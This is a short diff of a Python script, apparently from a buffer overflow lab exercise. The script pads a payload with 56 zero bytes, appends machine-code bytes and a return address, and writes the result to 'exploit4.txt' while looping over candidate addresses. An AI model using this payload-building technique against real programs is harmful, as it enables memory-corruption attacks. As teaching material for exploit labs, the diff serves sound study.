@@ -22,7 +22,8 @@ for i in range(4201265,4201323):
         fill_buffer = ""
         for k in range(56):
             fill_buffer = fill_buffer + "00 "
-        out_buffer = fill_buffer + output + "48 c7 c7 25 68 75 54 00"
+
+        out_buffer = fill_buffer + output + "48 c7 c7 25 68 75 54 00"  + " 8c 19 40 00 00 00 00 00"
 
         text_file = open("exploit4.txt", "w")
         text_file.write("%s" % out_buffer)
